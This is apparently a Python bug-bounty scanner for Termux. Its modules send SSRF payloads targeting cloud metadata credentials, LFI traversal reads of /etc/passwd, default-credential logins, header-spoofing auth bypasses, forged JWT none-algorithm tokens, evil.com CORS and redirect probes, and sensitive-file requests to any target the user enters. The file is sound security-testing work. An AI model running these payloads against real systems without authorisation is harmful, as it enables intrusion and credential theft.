#!/usr/bin/env python3
"""
Termux Bug Bounty Arsenal v5.1 by Mrbead93
Unrooted Android | Semi-Automated | Guided
"""

import os, sys, subprocess, datetime, time
import re, json, base64
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
init(autoreset=True)

HOME        = os.path.expanduser("~")
PROJECTS    = os.path.join(HOME, "projects")
ARSENAL_DIR = os.path.dirname(os.path.abspath(__file__))
XSSTRIKE    = os.path.join(PROJECTS, "xsstrike", "xsstrike.py")
last_target = "None set"

SECRET_PATTERNS = {
    "AWS Access Key":  r"AKIA[0-9A-Z]{16}",
    "Google API Key":  r"AIza[0-9A-Za-z\-_]{35}",
    "GitHub Token":    r"ghp_[0-9a-zA-Z]{36}",
    "Slack Token":     r"xox[baprs]-([0-9a-zA-Z]{10,48})",
    "Stripe Key":      r"(?:r|s)k_live_[0-9a-zA-Z]{24}",
    "JWT Token":       r"eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*",
    "Private Key":     r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
    "Password in JS":  r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"][^'\"]{4,}['\"]",
    "API Key Generic": r"(?i)(api_key|apikey|api-key)\s*[:=]\s*['\"][^'\"]{8,}['\"]",
    "Bearer Token":    r"(?i)bearer\s+[a-zA-Z0-9\-._~+/]+=*",
    "Firebase URL":    r"https://[a-z0-9-]+\.firebaseio\.com",
    "Secret Generic":  r"(?i)(secret|token)\s*[:=]\s*['\"][^'\"]{8,}['\"]",
}

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost:22/",
    "http://localhost:3306/",
    "file:///etc/passwd",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
]

CORS_ORIGINS    = ["https://evil.com", "null", "http://localhost"]
SENSITIVE_FILES = [
    "/.git/config", "/.env", "/.env.local", "/.env.production",
    "/config.php", "/wp-config.php", "/config.yml", "/.htaccess",
    "/phpinfo.php", "/server-status", "/actuator/env",
    "/debug", "/.DS_Store", "/backup.zip", "/backup.sql",
    "/robots.txt", "/sitemap.xml",
]
TAKEOVER_FINGERPRINTS = {
    "GitHub Pages": "There isn't a GitHub Pages site here",
    "Heroku":       "No such app",
    "Shopify":      "Sorry, this shop is currently unavailable",
    "Fastly":       "Fastly error: unknown domain",
    "Surge.sh":     "project not found",
    "Zendesk":      "Help Center Closed",
    "S3 Bucket":    "NoSuchBucket",
}
API_WORDLIST = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/api/users", "/api/user", "/api/admin",
    "/api/login", "/api/auth", "/api/token",
    "/api/config", "/api/settings", "/api/debug",
    "/api/health", "/api/status", "/api/info",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/graphql", "/v1", "/v2", "/rest",
    "/.well-known/openid-configuration",
]

W = 58

def clr():
    os.system("clear")

def box_top():
    return Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+"

def box_bot():
    return Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+"

def box_row(text="", colour=None):
    col   = colour if colour else Fore.WHITE
    inner = text[:W]
    pad   = W - len(inner)
    return Fore.CYAN + Style.BRIGHT + "  |" + col + " " + inner + " " * (pad - 1) + Fore.CYAN + Style.BRIGHT + "|"

def box_div():
    return Fore.CYAN + Style.BRIGHT + "  |" + "-" * W + "|"

def banner():
    clr()
    print(box_top())
    print(box_row())
    print(box_row("  TERMUX BUG BOUNTY ARSENAL  v5.1", Fore.CYAN + Style.BRIGHT))
    print(box_row("  Unrooted Android  |  by Mrbead93", Fore.YELLOW))
    print(box_row("  Recon | Vulns | API | JS | Auth | Misconfig", Style.DIM))
    print(box_row())
    print(box_div())
    print(box_row("  Target : " + last_target, Fore.YELLOW))
    print(box_row("  Time   : " + datetime.datetime.now().strftime("%d %b %Y  %H:%M"), Fore.YELLOW))
    print(box_bot())
    print()

def section_header(title, subtitle=""):
    clr()
    banner()
    print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
    t = "  " + title
    print(Fore.CYAN + Style.BRIGHT + "  |" + Fore.WHITE + Style.BRIGHT +
          (" " + title)[:W] + " " * (W - len(title) - 1) + Fore.CYAN + "|")
    if subtitle:
        print(Fore.CYAN + "  |" + Style.DIM +
              (" " + subtitle)[:W] + " " * max(0, W - len(subtitle) - 1) + Fore.CYAN + "|")
    print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
    print()

def ok(m):    print(Fore.GREEN  + "  [OK]   " + m)
def warn(m):  print(Fore.YELLOW + "  [WARN] " + m)
def err(m):   print(Fore.RED    + "  [ERR]  " + m)
def info(m):  print(Fore.CYAN   + "  [INFO] " + m)
def tip(m):   print(Style.DIM   + "  [TIP]  " + m)
def gap():    print()

def found(m):
    print()
    print(Fore.RED + Style.BRIGHT + "  +-" + "-" * (W - 2) + "-+")
    print(Fore.RED + Style.BRIGHT + "  | FOUND: " + m[:W - 9] + " " * max(0, W - 9 - len(m)) + " |")
    print(Fore.RED + Style.BRIGHT + "  +-" + "-" * (W - 2) + "-+")
    print()

def section(title):
    print()
    print(Fore.CYAN + Style.BRIGHT + "  -- " + title + " " + "-" * max(0, W - len(title) - 5))

def pause():
    print()
    input(Fore.CYAN + "  Press Enter to return to menu...")

def normalise_url(t):
    return t if t.startswith("http") else "https://" + t

def check_tool(name):
    return subprocess.run("which " + name, shell=True, capture_output=True).returncode == 0

def get_target(prompt="  Target domain (e.g. example.com) : "):
    global last_target
    t = input(Fore.WHITE + prompt).strip()
    if t:
        last_target = t
    return t

def save_findings(target, module, findings):
    d = os.path.join(ARSENAL_DIR, "reports", target)
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, module + "_findings.json")
    json.dump(findings, open(p, "w"), indent=2)
    ok("Findings saved to " + p)
    return p

def print_bar(current, total, label=""):
    width   = 30
    filled  = int(width * current / max(total, 1))
    bar     = "#" * filled + "." * (width - filled)
    percent = int(current / max(total, 1) * 100)
    line    = "\r  [" + bar + "] " + str(percent).rjust(3) + "%  " + label[:25]
    sys.stdout.write(line)
    sys.stdout.flush()

def run_tool_with_status(cmd, name, tip_text=""):
    gap()
    print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
    row = "  Running: " + name
    print(Fore.CYAN + Style.BRIGHT + "  |" + Fore.WHITE + Style.BRIGHT +
          row[:W] + " " * max(0, W - len(row)) + Fore.CYAN + "|")
    if tip_text:
        hint = "  " + tip_text
        print(Fore.CYAN + "  |" + Style.DIM +
              hint[:W] + " " * max(0, W - len(hint)) + Fore.CYAN + "|")
    print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
    gap()

    spinner = ["|", "/", "-", "\\"]
    proc    = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    i     = 0
    start = time.time()
    while proc.poll() is None:
        elapsed = int(time.time() - start)
        mins    = elapsed // 60
        secs    = elapsed % 60
        sys.stdout.write(
            "\r  " + Fore.CYAN + spinner[i % 4] + Style.RESET_ALL +
            "  Running " + name[:25] + "  " +
            Fore.YELLOW + str(mins).zfill(2) + ":" + str(secs).zfill(2) +
            Style.RESET_ALL + "  (CTRL+C to skip)    "
        )
        sys.stdout.flush()
        time.sleep(0.2)
        i += 1

    stdout, stderr = proc.communicate()
    elapsed = int(time.time() - start)
    mins    = elapsed // 60
    secs    = elapsed % 60

    sys.stdout.write("\r" + " " * 72 + "\r")
    sys.stdout.flush()

    if proc.returncode == 0:
        ok("Completed in " + str(mins).zfill(2) + ":" + str(secs).zfill(2))
    else:
        warn("Finished with warnings (" + str(mins).zfill(2) + ":" + str(secs).zfill(2) + ")")
        if stderr:
            for line in stderr.strip().split("\n")[:2]:
                if line.strip():
                    tip(line.strip()[:60])
    gap()
    return stdout


def extract_js_urls(url, html):
    soup    = BeautifulSoup(html, "html.parser")
    js_urls = []
    base    = "/".join(url.split("/")[:3])
    for tag in soup.find_all("script", src=True):
        src = tag["src"]
        if src.startswith("http"):
            js_urls.append(src)
        elif src.startswith("//"):
            js_urls.append("https:" + src)
        elif src.startswith("/"):
            js_urls.append(base + src)
    return js_urls


def scan_js_content(content, source):
    results = []
    for stype, pattern in SECRET_PATTERNS.items():
        try:
            matches = re.findall(pattern, content)
            if matches:
                for match in matches[:3]:
                    results.append({
                        "type":   stype,
                        "match":  str(match)[:100],
                        "source": source
                    })
        except Exception:
            pass
    return results


# ============================================================
#  MODULE 9 - VULNERABILITY SCANNER
# ============================================================

def module_vuln_scanner():
    section_header("MODULE 9 - VULNERABILITY SCANNER",
                   "XSS | SQL Injection | SSRF | Local File Inclusion")
    tip("Only test against targets you have written permission to test.")
    gap()
    target = get_target()
    if not target:
        return
    url     = normalise_url(target)
    out_dir = os.path.join(ARSENAL_DIR, "reports", target)
    os.makedirs(out_dir, exist_ok=True)

    print(Fore.CYAN + "  +" + "-" * W + "+")
    print(box_row("  1.  XSS Scan          (XSStrike)"))
    print(box_row("  2.  SQL Injection      (sqlmap)"))
    print(box_row("  3.  SSRF Test          (custom)"))
    print(box_row("  4.  LFI Test           (custom)"))
    print(box_row("  5.  Run all of the above"))
    print(box_row("  0.  Back to menu"))
    print(Fore.CYAN + "  +" + "-" * W + "+")
    gap()
    choice = input(Fore.WHITE + "  Choose : ").strip()
    if choice == "0":
        return

    findings = []

    if choice in ("1", "5"):
        section("XSS SCAN")
        info("Cross-Site Scripting lets attackers inject malicious scripts.")
        info("XSStrike will crawl your target and test every input field.")
        gap()
        if os.path.exists(XSSTRIKE):
            run_tool_with_status(
                "python3 " + XSSTRIKE + " -u " + url + " --crawl --blind",
                "XSStrike XSS Scanner",
                "Crawling and testing inputs -- takes 2-5 minutes"
            )
        else:
            warn("XSStrike not installed.")
            info("Run: git clone https://github.com/s0md3v/XSStrike.git " + PROJECTS + "/xsstrike")

    if choice in ("2", "5"):
        section("SQL INJECTION SCAN")
        info("SQL injection can expose or destroy your entire database.")
        warn("This step takes 5-15 minutes -- this is completely normal!")
        tip("sqlmap is crawling forms and testing each parameter.")
        gap()
        if check_tool("sqlmap"):
            run_tool_with_status(
                "sqlmap -u " + url + " --batch --level=2 --risk=1 "
                "--output-dir=" + out_dir + "/sqlmap --forms --crawl=2",
                "sqlmap SQL Injection",
                "Testing every form field for injection -- grab a coffee!"
            )
        else:
            warn("sqlmap not installed. Run: pip install sqlmap")

    if choice in ("3", "5"):
        section("SSRF TESTING")
        info("SSRF tricks the server into fetching internal resources.")
        info("This can expose cloud credentials and internal services.")
        gap()
        param = input("  Which URL parameter to inject? (e.g. url, redirect, next) : ").strip()
        if param:
            info("Testing " + str(len(SSRF_PAYLOADS)) + " SSRF payloads via ?" + param + "=")
            gap()
            for i, payload in enumerate(SSRF_PAYLOADS, 1):
                print_bar(i, len(SSRF_PAYLOADS), "Testing payload " + str(i))
                try:
                    r   = requests.get(
                        url + "?" + param + "=" + payload,
                        timeout=5, allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    hit = any(x in r.text.lower() for x in
                              ["ami-id", "metadata", "root:", "ec2"])
                    if hit:
                        gap()
                        found("SSRF: " + payload + " returned HTTP " + str(r.status_code))
                        tip("Server responded with internal data -- verify manually")
                        findings.append({"type": "ssrf", "payload": payload,
                                         "status": r.status_code})
                except Exception:
                    pass
            gap()
            ok("SSRF test complete")

    if choice in ("4", "5"):
        section("LFI TESTING")
        info("LFI can let attackers read sensitive files like /etc/passwd.")
        gap()
        param = input("  Which parameter loads files? (e.g. file, page, path) : ").strip()
        if param:
            info("Testing " + str(len(LFI_PAYLOADS)) + " LFI payloads via ?" + param + "=")
            gap()
            for i, payload in enumerate(LFI_PAYLOADS, 1):
                print_bar(i, len(LFI_PAYLOADS), "Testing payload " + str(i))
                try:
                    r   = requests.get(
                        url + "?" + param + "=" + payload,
                        timeout=5,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    hit = any(x in r.text for x in
                              ["root:x:", "daemon:", "<?php", "uid="])
                    if hit:
                        gap()
                        found("LFI CONFIRMED: " + payload)
                        tip("Server is reading local files -- this is a critical finding!")
                        findings.append({"type": "lfi", "payload": payload,
                                         "snippet": r.text[:200]})
                except Exception:
                    pass
            gap()
            ok("LFI test complete")

    gap()
    if findings:
        save_findings(target, "vuln", findings)
        found(str(len(findings)) + " vulnerability findings saved!")
    else:
        ok("No confirmed vulnerabilities found on this scan.")
        tip("Try testing individual parameters manually for deeper coverage.")
    pause()


# ============================================================
#  MODULE 10 - API HUNTER
# ============================================================

def module_api_hunter():
    section_header("MODULE 10 - API HUNTER",
                   "Discovers hidden API endpoints and exposed documentation")
    tip("APIs often expose sensitive data -- unprotected endpoints are goldmines.")
    gap()
    target = get_target()
    if not target:
        return
    url      = normalise_url(target)
    headers  = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    findings = []

    section("ENDPOINT DISCOVERY")
    info("Testing " + str(len(API_WORDLIST)) + " common API paths against " + url)
    info("This usually completes in 1-3 minutes...")
    gap()

    for i, endpoint in enumerate(API_WORDLIST, 1):
        print_bar(i, len(API_WORDLIST), "Checking " + endpoint[:20])
        try:
            r       = requests.get(url + endpoint, timeout=5, headers=headers)
            is_json = ("json" in r.headers.get("Content-Type", "") or
                       r.text.strip().startswith(("{", "[")))

            if r.status_code in (200, 201, 401, 403, 405):
                gap()
                if r.status_code in (200, 201):
                    found("OPEN ENDPOINT: " + endpoint +
                          (" [JSON]" if is_json else ""))
                    tip("This endpoint is publicly accessible -- check its contents")
                elif r.status_code in (401, 403):
                    warn("Protected endpoint exists: " + endpoint)
                    tip("Exists but requires authentication -- worth noting in report")
                else:
                    info("Endpoint exists but method restricted: " + endpoint)
                findings.append({
                    "endpoint": url + endpoint,
                    "status":   r.status_code,
                    "json":     is_json
                })
        except Exception:
            pass

    gap()
    section("API DOCUMENTATION EXPOSURE")
    info("Exposed API docs give attackers a full map of your API.")
    gap()

    doc_paths = ["/swagger.json", "/openapi.json", "/api-docs",
                 "/swagger/index.html", "/.well-known/openid-configuration"]

    for path in doc_paths:
        try:
            r = requests.get(url + path, timeout=5, headers=headers)
            if r.status_code == 200:
                found("API DOCS EXPOSED: " + url + path)
                tip("Attackers can use these docs to discover every API endpoint")
                findings.append({"type": "docs_exposed", "path": path})
            else:
                print(Style.DIM + "  [-] " + path + " -> " + str(r.status_code))
        except Exception:
            pass

    gap()
    if findings:
        save_findings(target, "api", findings)
        ok(str(len(findings)) + " API endpoints found and saved.")
    else:
        ok("No open API endpoints found.")
        tip("The site may use non-standard paths -- try manual testing.")
    pause()


# ============================================================
#  MODULE 11 - JS SECRET SCANNER
# ============================================================

def module_js_scanner():
    section_header("MODULE 11 - JS SECRET SCANNER",
                   "Hunts for API keys, tokens and passwords in JavaScript files")
    tip("Developers often accidentally leave secrets in frontend JavaScript.")
    gap()
    target = get_target()
    if not target:
        return
    url      = normalise_url(target)
    headers  = {"User-Agent": "Mozilla/5.0"}
    findings = []

    section("STEP 1 - FINDING JAVASCRIPT FILES")
    info("Loading " + url + " and collecting all JS file references...")
    gap()

    try:
        r       = requests.get(url, timeout=10, headers=headers)
        js_urls = extract_js_urls(url, r.text)
        ok("Page loaded -- found " + str(len(js_urls)) + " external JS files")
        soup    = BeautifulSoup(r.text, "html.parser")
        inlines = [s for s in soup.find_all("script", src=False)
                   if s.string and len(s.string.strip()) > 50]
        ok("Found " + str(len(inlines)) + " inline script blocks to scan")
    except Exception as e:
        err("Could not load " + url)
        err("Details: " + str(e))
        tip("Check the URL is correct and the site is online.")
        pause()
        return

    if not js_urls and not inlines:
        warn("No JavaScript found on this page.")
        tip("Try scanning a specific JS file URL directly.")
        pause()
        return

    gap()
    section("STEP 2 - SCANNING EXTERNAL JS FILES")
    info("Scanning each file for " + str(len(SECRET_PATTERNS)) + " types of secrets...")
    info("Checking for: API keys, tokens, passwords, private keys and more.")
    gap()

    for i, js_url in enumerate(js_urls, 1):
        print_bar(i, len(js_urls), "File " + str(i) + " of " + str(len(js_urls)))
        try:
            jr   = requests.get(js_url, timeout=8, headers=headers)
            hits = scan_js_content(jr.text, js_url)
            if hits:
                gap()
                for h in hits:
                    found(h["type"] + " detected in JS file!")
                    print(Fore.YELLOW + "  Value  : " + h["match"][:60])
                    print(Style.DIM   + "  Source : ..." + js_url[-50:])
                findings.extend(hits)
        except Exception:
            pass

    gap()
    section("STEP 3 - SCANNING INLINE SCRIPTS")
    info("Scanning " + str(len(inlines)) + " inline script blocks...")
    gap()

    for i, script in enumerate(inlines, 1):
        print_bar(i, len(inlines), "Inline block " + str(i) + " of " + str(len(inlines)))
        try:
            hits = scan_js_content(script.string, url + " [inline #" + str(i) + "]")
            if hits:
                gap()
                for h in hits:
                    found(h["type"] + " found in inline script!")
                    print(Fore.YELLOW + "  Value  : " + h["match"][:60])
                findings.extend(hits)
        except Exception:
            pass

    gap()
    if findings:
        save_findings(target, "js_secrets", findings)
        gap()
        print(Fore.RED + Style.BRIGHT + "  " + "!" * W)
        print(Fore.RED + Style.BRIGHT + "  " + str(len(findings)) +
              " SECRETS FOUND -- these need immediate attention!")
        print(Fore.RED + Style.BRIGHT + "  " + "!" * W)
        tip("Report these as sensitive data exposure in your bug bounty submission.")
    else:
        ok("No secrets found in any JavaScript files.")
        tip("A clean result means the site is keeping secrets server-side -- good sign.")
    pause()


# ============================================================
#  MODULE 12 - AUTH TESTER
# ============================================================

def module_auth_tester():
    section_header("MODULE 12 - AUTH TESTER",
                   "Tests login pages, sessions, bypasses and JWT vulnerabilities")
    tip("Authentication bugs are among the highest impact findings in bug bounties.")
    gap()
    target = get_target()
    if not target:
        return
    url      = normalise_url(target)
    findings = []

    print(Fore.CYAN + "  +" + "-" * W + "+")
    print(box_row("  1.  Default Credential Test"))
    print(box_row("      Tries common username/password combinations"))
    print(box_row(""))
    print(box_row("  2.  Auth Bypass Header Test"))
    print(box_row("      Tests IP spoofing headers for access bypass"))
    print(box_row(""))
    print(box_row("  3.  Security Header Audit"))
    print(box_row("      Checks for missing security response headers"))
    print(box_row(""))
    print(box_row("  4.  JWT None Algorithm Test"))
    print(box_row("      Tests for unsigned JWT token acceptance"))
    print(box_row(""))
    print(box_row("  5.  Run all of the above"))
    print(box_row("  0.  Back to menu"))
    print(Fore.CYAN + "  +" + "-" * W + "+")
    gap()
    choice = input(Fore.WHITE + "  Choose : ").strip()
    if choice == "0":
        return

    if choice in ("1", "5"):
        section("DEFAULT CREDENTIAL TEST")
        info("Many systems ship with default credentials that never get changed.")
        info("We will try common username and password combinations.")
        gap()
        login_path = input("  Login page path [default /admin] : ").strip() or "/admin"
        user_field = input("  Username field name [default username] : ").strip() or "username"
        pass_field = input("  Password field name [default password] : ").strip() or "password"
        login_url  = url + login_path

        creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", "admin123"), ("root", "root"), ("root", "toor"),
            ("test", "test"), ("user", "user"),
            ("administrator", "administrator"), ("admin", ""), ("guest", "guest"),
        ]

        gap()
        info("Testing " + str(len(creds)) + " credential pairs against " + login_url)
        warn("Watch closely -- any FOUND result below needs manual verification!")
        gap()

        for i, (u, p) in enumerate(creds, 1):
            print_bar(i, len(creds), "Trying " + u + ":" + p)
            try:
                r    = requests.post(
                    login_url,
                    data={user_field: u, pass_field: p},
                    timeout=5, allow_redirects=True,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                body   = r.text.lower()
                ok_hit = any(x in body for x in
                             ["dashboard", "welcome", "logout", "profile", "account"])
                fail   = any(x in body for x in
                             ["invalid", "incorrect", "failed", "wrong", "error"])
                if ok_hit or (r.status_code == 302 and not fail):
                    gap()
                    found("POSSIBLE LOGIN: " + u + ":" + p + " -> HTTP " + str(r.status_code))
                    tip("Verify this manually in a browser to confirm access")
                    findings.append({"type": "default_creds",
                                     "username": u, "password": p})
            except Exception:
                pass
        gap()
        ok("Default credential test complete")

    if choice in ("2", "5"):
        section("AUTH BYPASS HEADER TEST")
        info("Some servers trust certain headers to identify internal requests.")
        info("Adding these headers may grant access to protected pages.")
        gap()
        protected = input("  Protected path to test [default /admin] : ").strip() or "/admin"
        test_url  = url + protected

        bypass_headers = [
            {"X-Original-URL":            "/admin"},
            {"X-Rewrite-URL":             "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For":           "127.0.0.1"},
            {"X-Remote-IP":               "127.0.0.1"},
            {"X-Remote-Addr":             "127.0.0.1"},
        ]

        try:
            baseline = requests.get(
                test_url, timeout=5,
                headers={"User-Agent": "Mozilla/5.0"}
            ).status_code
            info("Baseline response without bypass headers: HTTP " + str(baseline))
        except Exception:
            baseline = 0

        gap()
        for i, hdrs in enumerate(bypass_headers, 1):
            key = list(hdrs.keys())[0]
            print_bar(i, len(bypass_headers), "Testing " + key[:30])
            try:
                h = {"User-Agent": "Mozilla/5.0"}
                h.update(hdrs)
                r = requests.get(test_url, timeout=5, headers=h)
                if r.status_code == 200 and baseline != 200:
                    gap()
                    found("BYPASS: " + key + " granted HTTP 200 access!")
                    tip("Server is trusting this header -- access control is bypassable!")
                    findings.append({"type": "auth_bypass", "header": hdrs})
            except Exception:
                pass
        gap()
        ok("Auth bypass test complete")

    if choice in ("3", "5"):
        section("SECURITY HEADER AUDIT")
        info("Security headers protect users from common web attacks.")
        info("Missing headers are easy wins in bug bounty programmes.")
        gap()
        try:
            r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})

            print(Fore.CYAN + Style.BRIGHT + "  Cookies:")
            for cookie in r.cookies:
                issues = []
                if not cookie.secure:
                    issues.append("Missing Secure flag")
                if not cookie.has_nonstandard_attr("HttpOnly"):
                    issues.append("Missing HttpOnly flag")
                if not cookie.has_nonstandard_attr("SameSite"):
                    issues.append("Missing SameSite flag")
                if issues:
                    warn("Cookie '" + cookie.name + "' -- " + ", ".join(issues))
                    tip("Without these flags cookies can be stolen via XSS")
                    findings.append({"type": "cookie_issue",
                                     "name": cookie.name, "issues": issues})
                else:
                    ok("Cookie '" + cookie.name + "' -- all security flags present")

            gap()
            print(Fore.CYAN + Style.BRIGHT + "  Security Headers:")
            checks = [
                ("Strict-Transport-Security", "Forces HTTPS -- prevents downgrade attacks"),
                ("X-Frame-Options",           "Prevents clickjacking attacks"),
                ("X-Content-Type-Options",    "Prevents MIME type sniffing"),
                ("Content-Security-Policy",   "Controls resource loading policy"),
                ("X-XSS-Protection",          "Legacy XSS protection header"),
                ("Referrer-Policy",           "Controls referrer information leakage"),
                ("Permissions-Policy",        "Controls browser feature access"),
            ]
            for header, description in checks:
                val = r.headers.get(header)
                if val:
                    ok(header + " -- present")
                    print(Style.DIM + "         " + val[:55])
                else:
                    warn("MISSING: " + header)
                    tip(description)
                    findings.append({"type": "missing_header", "header": header})

        except Exception as e:
            err("Could not reach " + url + ": " + str(e))

        gap()
        ok("Security header audit complete")

    if choice in ("4", "5"):
        section("JWT NONE ALGORITHM TEST")
        info("Some JWT implementations accept 'none' as a valid signing algorithm.")
        info("This means an attacker can forge tokens without needing the secret key.")
        gap()
        token = input("  Paste a JWT token to test (or Enter to skip) : ").strip()

        if token and token.count(".") == 2:
            parts = token.split(".")
            try:
                pad     = parts[1] + "=" * (4 - len(parts[1]) % 4)
                payload = json.loads(base64.b64decode(pad))
                gap()
                info("Token decoded successfully. Payload contents:")
                for k, v in payload.items():
                    print(Fore.WHITE + "    " + str(k) + ": " + str(v))
                gap()
                h_none = base64.b64encode(
                    b'{"alg":"none","typ":"JWT"}'
                ).decode().rstrip("=")
                forged = h_none + "." + parts[1] + "."
                warn("Forged none-algorithm token created:")
                print(Fore.YELLOW + "    " + forged[:75] + "...")
                gap()
                tip("Send this in your Authorization: Bearer header.")
                tip("If the server accepts it, the JWT none bug is confirmed -- P1 severity!")
                findings.append({"type": "jwt_none", "forged": forged[:100]})
            except Exception as e:
                err("Could not decode token: " + str(e))
                tip("Make sure you pasted the complete JWT including both dots.")
        elif token:
            warn("That does not look like a valid JWT -- it should have two dots in it.")

    gap()
    if findings:
        save_findings(target, "auth", findings)
        found(str(len(findings)) + " authentication issues found and saved!")
    else:
        ok("No authentication issues found.")
    pause()


# ============================================================
#  MODULE 13 - MISCONFIGURATION HUNTER
# ============================================================

def module_misconfig_hunter():
    section_header("MODULE 13 - MISCONFIGURATION HUNTER",
                   "CORS | Subdomain Takeover | Open Redirect | Sensitive Files")
    tip("Misconfigurations are the most common vulnerability class in modern apps.")
    gap()
    target = get_target()
    if not target:
        return
    url      = normalise_url(target)
    findings = []

    print(Fore.CYAN + "  +" + "-" * W + "+")
    print(box_row("  1.  CORS Misconfiguration"))
    print(box_row("      Checks if other origins can steal your data"))
    print(box_row(""))
    print(box_row("  2.  Subdomain Takeover Check"))
    print(box_row("      Checks for hijackable abandoned subdomains"))
    print(box_row(""))
    print(box_row("  3.  Open Redirect Test"))
    print(box_row("      Tests redirect parameters for external hijacking"))
    print(box_row(""))
    print(box_row("  4.  Sensitive File Exposure"))
    print(box_row("      Hunts for .env files, configs, backups and more"))
    print(box_row(""))
    print(box_row("  5.  Run all of the above"))
    print(box_row("  0.  Back to menu"))
    print(Fore.CYAN + "  +" + "-" * W + "+")
    gap()
    choice = input(Fore.WHITE + "  Choose : ").strip()
    if choice == "0":
        return

    if choice in ("1", "5"):
        section("CORS MISCONFIGURATION TEST")
        info("CORS controls which websites can make cross-origin requests.")
        info("A misconfigured policy lets attackers steal authenticated data.")
        gap()
        info("Testing " + str(len(CORS_ORIGINS)) + " malicious origins against " + url)
        gap()

        for i, origin in enumerate(CORS_ORIGINS, 1):
            print_bar(i, len(CORS_ORIGINS), "Origin: " + origin[:30])
            try:
                r    = requests.get(
                    url, timeout=5,
                    allow_redirects=False,
                    headers={"Origin": origin, "User-Agent": "Mozilla/5.0"}
                )
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")

                if acao in (origin, "*"):
                    gap()
                    if acac.lower() == "true":
                        found("CRITICAL CORS: " + origin + " reflected WITH credentials!")
                        tip("This is a P1 Critical -- attackers can steal authenticated user data")
                        findings.append({"type": "cors_critical",
                                         "origin": origin, "credentials": True})
                    else:
                        warn("CORS: " + origin + " is reflected (no credentials)")
                        tip("Low-Medium severity -- origin trusted but no credentials exposed")
                        findings.append({"type": "cors_moderate", "origin": origin})
            except requests.exceptions.Timeout:
                print(Style.DIM + "\n  Timeout on " + origin + " -- skipping")
            except Exception:
                pass
        gap()
        ok("CORS test complete")

    if choice in ("2", "5"):
        section("SUBDOMAIN TAKEOVER CHECK")
        info("When services are removed, their DNS records can remain active.")
        info("Attackers register the abandoned service and own the subdomain.")
        gap()

        sf = os.path.join(ARSENAL_DIR, "reports", target, "subdomains.txt")
        if not os.path.exists(sf):
            warn("No subdomains.txt found for this target.")
            info("Run option 3 from the main menu first to discover subdomains,")
            info("then return here to check them for takeover vulnerabilities.")
        else:
            subs = [l.strip() for l in open(sf) if l.strip()]
            limit = min(len(subs), 50)
            info("Checking " + str(limit) + " subdomains for takeover fingerprints...")
            gap()

            for i, sub in enumerate(subs[:50], 1):
                print_bar(i, limit, sub[:35])
                try:
                    r = requests.get(
                        "https://" + sub, timeout=5,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    for service, fingerprint in TAKEOVER_FINGERPRINTS.items():
                        if fingerprint.lower() in r.text.lower():
                            gap()
                            found("TAKEOVER POSSIBLE: " + sub + " -> " + service)
                            tip("Register on " + service + " with this subdomain to confirm")
                            findings.append({"type": "subdomain_takeover",
                                             "subdomain": sub, "service": service})
                            break
                except Exception:
                    pass
            gap()
            ok("Subdomain takeover check complete")

    if choice in ("3", "5"):
        section("OPEN REDIRECT TEST")
        info("Open redirects send users to attacker-controlled websites.")
        info("Commonly used in phishing -- often underrated as a finding.")
        gap()

        payloads = [
            "https://evil.com", "//evil.com",
            "///evil.com", "/%5cevil.com", "%2F%2Fevil.com",
        ]
        params = ["redirect", "url", "next", "return",
                  "returnUrl", "goto", "dest", "target"]
        total  = len(params) * len(payloads)
        count  = 0

        info("Testing " + str(total) + " redirect parameter combinations...")
        gap()

        for param in params:
            for payload in payloads:
                count += 1
                print_bar(count, total, "?" + param + "=" + payload[:20])
                try:
                    r = requests.get(
                        url + "?" + param + "=" + payload,
                        timeout=5, allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    if "evil.com" in r.headers.get("Location", ""):
                        gap()
                        found("OPEN REDIRECT: ?" + param + "=" + payload)
                        tip("Users hitting this URL will be sent to evil.com")
                        findings.append({"type": "open_redirect",
                                         "param": param, "payload": payload})
                except Exception:
                    pass
        gap()
        ok("Open redirect test complete")

    if choice in ("4", "5"):
        section("SENSITIVE FILE EXPOSURE")
        info("Developers often leave config files and backups publicly accessible.")
        info("These can contain database credentials, API keys and secrets.")
        gap()
        info("Checking " + str(len(SENSITIVE_FILES)) + " common sensitive file paths...")
        gap()

        for i, path in enumerate(SENSITIVE_FILES, 1):
            print_bar(i, len(SENSITIVE_FILES), path[:35])
            try:
                r = requests.get(
                    url + path, timeout=5,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                if r.status_code == 200:
                    gap()
                    found("EXPOSED: " + path + " (" + str(len(r.content)) + " bytes)")
                    tip("This file is publicly accessible -- review contents immediately")
                    print(Style.DIM + "  Preview: " +
